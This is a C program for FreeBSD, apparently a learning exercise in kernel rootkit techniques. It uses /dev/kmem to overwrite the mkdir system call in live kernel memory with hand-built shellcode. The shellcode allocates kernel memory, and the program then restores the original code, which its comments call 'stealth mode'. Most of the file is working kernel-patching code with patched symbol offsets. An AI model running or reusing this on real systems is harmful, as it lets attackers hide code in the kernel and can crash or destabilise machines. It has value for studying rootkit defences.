// Here we want to call kmalloc from user land. 
// Isnt this already done by the kmalloctest program which
// does operate in user mode? 
// Well it does: but kmalloc itself was installed as a sys call
//into the kernel.
// Now what we are doing is to get the code of kmalloc injected
// into a regular pre-existing system call. 
// Then use that syscall to call kmalloc and then restore the
// original system call again. Stealth mode, what?
#include <fcntl.h>
#include <kvm.h>
#include <limits.h>
#include <nlist.h>
#include <stdio.h>
#include <sys/syscall.h>
#include <sys/types.h>
#include <sys/module.h>

// The entire disassembled byte codes of the kmalloc syscall (which
//is in kmalloc.c is given below. objdump -dR kmalloc.ko and then 
// massage the output so that is has the right double quotes
// and comment lines etc for the initialization string below.
unsigned char kmalloc[] = 
"\x55" 					/*push   %ebp*/
"\x89\xe5" 				/*mov    %esp,%ebp*/
"\x53" 					/*push   %ebx*/
"\x83\xec\x10" 				/*sub    $0x10,%esp*/
"\x8b\x5d\x0c" 				/*mov    0xc(%ebp),%ebx*/
"\xc7\x44\x24\x08\x01\x00\x00\x00"	/*movl   $0x1,0x8(%esp)*/
"\xc7\x44\x24\x04\x00\x00\x00\x00" 	/*movl   $0x0,0x4(%esp)*/
"\x8b\x03" 				/*mov    (%ebx),%eax*/
"\x89\x04\x24" 				/*mov    %eax,(%esp)*/
"\xe8\xfc\xff\xff\xff" 			/*call   550 <kmalloc+0x20>*/
"\xc7\x44\x24\x08\x04\x00\x00\x00" 	/*movl   $0x4,0x8(%esp)*/
"\x89\x45\xf8" 				/*mov    %eax,0xfffffff8(%ebp)*/
"\x8b\x43\x04" 				/*mov    0x4(%ebx),%eax*/
"\x89\x44\x24\x04" 			/*mov    %eax,0x4(%esp)*/
"\x8d\x45\xf8" 				/*lea    0xfffffff8(%ebp),%eax*/
"\x89\x04\x24" 				/*mov    %eax,(%esp)*/
"\xe8\xfc\xff\xff\xff" 			/*call   56d <kmalloc+0x3d>*/
"\x83\xc4\x10" 				/*add    $0x10,%esp*/
"\x5b" 					/*pop    %ebx*/
"\x5d" 					/*pop    %ebp*/
"\xc3" 					/*ret    */
"\x89\xf6" 				/*mov    %esi,%esi*/
"\x8d\xbc\x27\x00\x00\x00\x00" 		/*lea    0x0(%edi),%edi*/
;

// The two offsets below are obviously crucial: I got this wrong by
// one, and the kernel paniced every time and shut itself down.
// These offsets are those of the first byte after the call instruction.
// Thus in the above array: there are two call instr opcodes(e8), one
// for the malloc call and the second for the copyout call. 
// Thus if you move 36 bytes from the start of the code you will
// reach the instruction after the first e8 call. The offset is not
// to be confused with the array index value: this is the offset
// when the code is laid out in memory. The array above contains
// the disassembled code, the addresses are different in memory obviously.
#define OFFSET_1 0x24
#define OFFSET_2 0x41


int main(int argc, char ** argv) {

	int i;
	char errbuf[_POSIX2_LINE_MAX];
	// virtual memory handle.
	kvm_t *kd;

	// array of nlist structs: we need atleast four since there
	// four symbols to search for.
	// Couple of things: when initializing an array whose size
	// is not specified, the RHS can contain a list of initializers
	// and can be ended with a , implying an indeterminate list.
	// Second: this array needs to have an extra null meaning:
	// that if we need four symbols the initializer list must
	// have five NULL structs, because the kernel looks for a null
	// terminated list. 
	struct nlist nl[] = {{NULL}, {NULL}, {NULL}, {NULL}, {NULL} , {NULL}};

	// we want to place the kmalloc code into the mkdir code
	// upto this array size.

	unsigned char mkdir_code[sizeof(kmalloc)];

	// This is the handle to the allocated virtual memory.
	unsigned long addr; 

	if (argc != 2) {
		printf("Usage:\n%s <size> \n", argv[0]);
		exit(0);
	}

	kd = kvm_openfiles(NULL, NULL, NULL, O_RDWR, errbuf);

	if (kd == NULL) {
		fprintf(stderr, "ERROR: %s\n", errbuf);
		exit(-1);
	}

// mkdir's address is the starting point for the system call.
// We are planning to overwrite the code for the mkdir syscall
// with the kmalloc array contents: in other words we are
// overwriting the mkdir syscall with our own code. 
// Now if a syscall is made to mkdir, kmalloc will run.
// However the addresses after the call statements in the array
// need to be replaced with the actual addresses of the malloc
// and copyout. To be precise (what is this Tintin? ) the
// addresses following the call opcode are not really addresses
// but a relative offset from the call site to the address of
// the called routine. 
// The memory layout looks something like below. 
// The call instruction is actually like a jump to another
// location, but preserving the call semantics. So its single
// operand has to be the offset by which the jump should be
// executed. The first jump is to the malloc routine, and 
// so the offset between the instruction immediately following
// the call site, and the malloc address is computed and that 
// is patched into the bytes that constitute the call operand.
// These are the four bytes immediately following the e8 op code.

//     ---->  mkdir address ------------------| -- nl[0].n_value 
//                                            |
//                                            |--> OFFSET_1
//     ---->  call to malloc (first e8)       |
//     ---->  instruction following call -----| -- nl[0].n_value + OFFSET_1
//                                            |
//                                            |--> offset value to be 
//                                            |   patched into the e8 call
//     ---->  malloc()   address         --------- nl[2].n_value

	nl[0].n_name = "mkdir";
	nl[1].n_name = "M_TEMP";
	nl[2].n_name = "malloc";
	nl[3].n_name = "copyout";

	if (kvm_nlist(kd, nl) < 0) {
		fprintf(stderr, "ERROR: %s\n", kvm_geterr(kd)); 
		exit(-1);
	}
	

	for (i = 0; i < 4; i++) {
		if (!nl[i].n_value) {
			fprintf(stderr, "ERROR: Symbol %s not found \n",
				nl[i].n_name);
			exit(-1);
		}
	}


	//M_TEMP
	// The M_TEMP address is a straight forward patch
	// into the kmalloc code. The array index is computed
	// by counting till the second move in the four movl
	// statements preceding the first call. The malloc
	// call takes four arguments, so there will be four
	// mov statements prior to the call. (C style call
	// semantics) 
	*(unsigned long *) &kmalloc[22] = nl[1].n_value;
	//malloc
	// The math below is clear when you look at the diagram
	// drawn above in the comment block.
	*(unsigned long *) &kmalloc[32] = nl[2].n_value -
		(nl[0].n_value + OFFSET_1) ;
	//copyout
	// same style of math for this as well.
	*(unsigned long *) &kmalloc[61] = nl[3].n_value -
		(nl[0].n_value + OFFSET_2);

// Now that the kmalloc array has been patched with the right
// offsets, it is time to load it into memory. So we first read
// that many bytes of the mkdir code into an array (to back it up)
// and then we overwrite mkdir with the contents of kmalloc array.
// At this point mkdir syscalls will execute the kmalloc code.
// And after making the syscall and getting a handle to memory
// we restore the contents back by writing the mkdir array back
// into memory.
// During this intervening period, if someone tries to make a dir
// they will be puzzled: actually it might fail in mysterious 
//ways.


	if (kvm_read(kd, nl[0].n_value, mkdir_code, sizeof(kmalloc)) < 0) {
		fprintf(stderr, "ERROR: %s\n", kvm_geterr(kd));
		exit(-1);
	}

	if (kvm_write(kd, nl[0].n_value, kmalloc, sizeof(kmalloc)) < 0) {
		fprintf(stderr, "ERROR: %s\n", kvm_geterr(kd));
		exit(-1);
	}

	  syscall(136, (unsigned long)atoi(argv[1]), &addr);

	printf("Address of allocated kernel memory: 0x%x\n", addr);


	if (kvm_write(kd, nl[0].n_value, mkdir_code, sizeof(kmalloc)) < 0) {
		fprintf(stderr, "ERROR: %s\n", kvm_geterr(kd));
		exit(-1);
	}


	if (kvm_close(kd) < 0) {
		fprintf(stderr, "ERROR: %s\n", kvm_geterr(kd));
		exit(-1);
	}

	exit(0);
}
